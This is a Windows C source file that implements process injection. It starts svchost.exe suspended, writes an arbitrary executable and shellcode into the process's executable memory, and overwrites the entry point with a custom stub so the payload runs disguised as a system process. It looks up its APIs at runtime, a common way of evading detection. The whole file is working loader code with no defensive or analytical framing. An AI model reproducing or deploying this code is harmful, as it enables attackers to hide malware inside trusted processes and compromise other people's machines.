
#include <stdio.h>
#include <stdlib.h>
#include <strsafe.h>
#include <Windows.h>

#include "define_ntdll.h"
#include "ShellCode/ShellCode.h"
#include "ShellCode/ShellCode64.h"
#include "LuoFile.h"

typedef void* (_cdecl* _pfnmemcpy)(void*, void*, size_t);
typedef void* (_cdecl* _pfnmemset)(void*, int, size_t);

typedef BOOL(WINAPI* PFNCreateProcess)(LPSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL(WINAPI* PFNReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
typedef BOOL(WINAPI* PFNWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef DWORD(WINAPI* PFNResumeThread)(HANDLE hThread);
typedef NTSTATUS(WINAPI* PFNZwQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef LPVOID(WINAPI* PFNVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef LPVOID(WINAPI* PFNVirtualProtectEx)(__in HANDLE hProcess, __in LPVOID lpAddress, __in SIZE_T dwSize, __in DWORD flNewProtect, __out PDWORD lpflOldProtect);

typedef BOOL(WINAPI* PFNWinStationTerminateProcess)(HANDLE ServerHandle, ULONG ProcessId, ULONG ExitCode);

static _pfnmemcpy pfnmemcpy = NULL;
static _pfnmemset pfnmemset = NULL;
static PFNZwQueryInformationProcess pfnZwQueryInformationProcess = NULL;
static PFNVirtualAllocEx			pfnVirtualAllocEx = NULL;
static PFNWriteProcessMemory		pfnWriteProcessMemory = NULL;
static PFNCreateProcess			    pfnCreateProcess = NULL;
static PFNResumeThread				pfnResumeThread = NULL;

static PFNWinStationTerminateProcess pfnWinStationTerminateProcess = NULL;

BOOL Initialize()
{
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	pfnmemset = (_pfnmemset)GetProcAddress(ntdll, "memset");
	pfnmemcpy = (_pfnmemcpy)GetProcAddress(ntdll, "memcpy");
	pfnZwQueryInformationProcess = (PFNZwQueryInformationProcess)GetProcAddress(ntdll, "ZwQueryInformationProcess");

	HMODULE Kernel = GetModuleHandleA("kernel32.dll");
	pfnVirtualAllocEx = (PFNVirtualAllocEx)GetProcAddress(Kernel, "VirtualAllocEx");
	pfnWriteProcessMemory = (PFNWriteProcessMemory)GetProcAddress(Kernel, "WriteProcessMemory");
	pfnCreateProcess = (PFNCreateProcess)GetProcAddress(Kernel, "CreateProcessA");
	pfnResumeThread = (PFNResumeThread)GetProcAddress(Kernel, "ResumeThread");

	HMODULE hWinStaDll = LoadLibrary(TEXT("WINSTA.dll"));
	pfnWinStationTerminateProcess = (PFNWinStationTerminateProcess)GetProcAddress(hWinStaDll, "WinStationTerminateProcess");

	if (pfnmemcpy == NULL ||
		pfnmemset == NULL ||
		pfnZwQueryInformationProcess == NULL ||
		pfnVirtualAllocEx == NULL ||
		pfnWriteProcessMemory == NULL ||
		pfnCreateProcess == NULL ||
		pfnResumeThread == NULL
		) {
		return FALSE;
	}

	return TRUE;
}

// -1 ���ǺϷ�PE 1 32λ 2 64λ 3 δ֪
int AnalyzeBuffer(LPBYTE pBuffer) {
	IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pBuffer;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return -1;
	}

	IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)((char*)pBuffer + pDosHeader->e_lfanew);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return -1;
	}

	if (pNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_I386)
	{
		return 1;
	}

	if (pNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_IA64 ||
		pNtHeader->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64)
	{
		return 2;
	}

	return 3;
}

BOOL StartProcess(LPBYTE pBuffer, DWORD Length)
{
	STARTUPINFO			si;
	PROCESS_INFORMATION pi;
	PEB					peb;
	SIZE_T				Index = 0;
	SHELLCODE			ShellCode;
	SHELLCODE64         ShellCode64;
	PROCESS_BASIC_INFORMATION pbi;

	IMAGE_DOS_HEADER ImgDosheader;
	IMAGE_NT_HEADERS ImgNtHeaders;

	SIZE_T len = 0;
	LPVOID remoteBuffer = NULL;
	LPVOID remoteShell = NULL;
	CHAR FilePath[MAX_PATH];

	pfnmemset(FilePath, 0, MAX_PATH);
	pfnmemset(&si, 0, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);

	GetWindowsDirectory(FilePath, MAX_PATH);

	BOOL bWow64 = FALSE;
	switch (AnalyzeBuffer(pBuffer))
	{
	case 1:
	{
		bWow64 = TRUE;
		break;
	}
	case 2:
	{
		bWow64 = FALSE;
		break;
	}
	default:
		return FALSE;
	}

	if (bWow64)
	{
		StringCbCat(FilePath, MAX_PATH, "\\SysWOW64\\svchost.exe");
	}
	else
	{
		StringCbCat(FilePath, MAX_PATH, "\\system32\\svchost.exe");
	}

	if (FALSE == pfnCreateProcess(FilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		return FALSE;
	}

	pfnZwQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), (PULONG)&Index);
	ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), &Index);

	remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (remoteBuffer == 0)
		return FALSE;

	WriteProcessMemory(pi.hProcess, remoteBuffer, pBuffer, Length, &len);

	if (bWow64)
	{
		remoteShell = VirtualAllocEx(pi.hProcess, NULL, SHELLCODE_LENGTH, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (remoteShell == NULL)
			return FALSE;

		WriteProcessMemory(pi.hProcess, remoteShell, SHELLCODE_BUFFER, SHELLCODE_LENGTH, &len);
	}
	else
	{
		remoteShell = VirtualAllocEx(pi.hProcess, NULL, SHELLCODE_LENGTH64, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (remoteShell == NULL)
			return FALSE;

		WriteProcessMemory(pi.hProcess, remoteShell, SHELLCODE_BUFFER64, SHELLCODE_LENGTH64, &len);
	}

	if (FALSE == ReadProcessMemory(pi.hProcess, peb.ImageBaseAddress, &ImgDosheader, sizeof(IMAGE_DOS_HEADER), &len))
		return FALSE;

	if (FALSE == ReadProcessMemory(pi.hProcess, (LPBYTE)peb.ImageBaseAddress + ImgDosheader.e_lfanew, &ImgNtHeaders, sizeof(IMAGE_NT_HEADERS), &len)) {
		return FALSE;
	}

	LPVOID Entry = (LPBYTE)peb.ImageBaseAddress + ImgNtHeaders.OptionalHeader.AddressOfEntryPoint;

	if (bWow64)
	{
		ShellCode.Push1 = 0x68;
		ShellCode.Call = 0xe8;

		ShellCode.CallAddress = (DWORD)remoteShell - (DWORD)Entry - sizeof(SHELLCODE);
		ShellCode.BufferAddress = (DWORD)remoteBuffer;

		if (FALSE == WriteProcessMemory(pi.hProcess, Entry, &ShellCode, sizeof(SHELLCODE), &len))
			return FALSE;
	}
	else
	{
		//sub rsp, -0x28
		ShellCode64.Sub1 = 0x48;
		ShellCode64.Sub2 = 0x83;
		ShellCode64.Sub3 = 0xEC;
		ShellCode64.Sub4 = 0x28;

		//mov rcx64, CallAddress
		ShellCode64.Mov1 = 0x48;
		ShellCode64.Rcx = 0xB9;
		ShellCode64.CallAddress = (__int64)remoteShell + 0x190;

		//mov rax64, BufferAddress
		ShellCode64.Mov2 = 0x48;
		ShellCode64.Rax2 = 0xB8;
		ShellCode64.BufferAddress = (__int64)remoteBuffer;

		//call ra64x
		ShellCode64.Call = 0xFF;
		ShellCode64.Rax3 = 0xD0;

		//add rsp, 0x28
		ShellCode64.Sub5 = 0x48;
		ShellCode64.Sub6 = 0x83;
		ShellCode64.Sub7 = 0xC4;
		ShellCode64.Sub8 = 0x28;

		//jmp rax
		ShellCode64.Jmp = 0xFF;
		ShellCode64.Rax4 = 0xE0;

		if (FALSE == WriteProcessMemory(pi.hProcess, Entry, &ShellCode64, sizeof(SHELLCODE64), &len))
			return FALSE;
	}

	ResumeThread(pi.hThread);

	return TRUE;
}


int main() {
	LPVOID lpFileBuffer = NULL;
	CHAR szFilePath[] = "LuoDst_x64.exe";
	DWORD dwFileSize = 0;
	dwFileSize = LuoReadFile(szFilePath, &lpFileBuffer);

	if (Initialize())
	{
		StartProcess((LPBYTE)lpFileBuffer, dwFileSize);
	}

	system("pause");
	return 0;
}
